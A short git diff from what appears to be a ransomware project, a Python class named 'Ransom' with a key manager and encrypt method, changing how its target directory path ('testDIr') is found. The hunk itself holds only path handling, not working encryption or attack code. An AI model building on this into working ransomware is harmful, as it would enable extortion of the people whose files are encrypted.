@@ -27,10 +27,10 @@ class Ransom:
         self.keyManager = KeyManager()
     
     def getDefaultRoot(self):
-        path = os.path.realpath('ransom.py')
-        parts = path.split('/')
-        path = '/'.join(parts[:-1])
-        path+='/testDIr/'
+        path = os.path.realpath('testDIr')
+        #parts = path.split('/')
+        #path = '/'.join(parts[:-1])
+        #path+='/testDIr/'
         return path
 
     def encrypt(self):
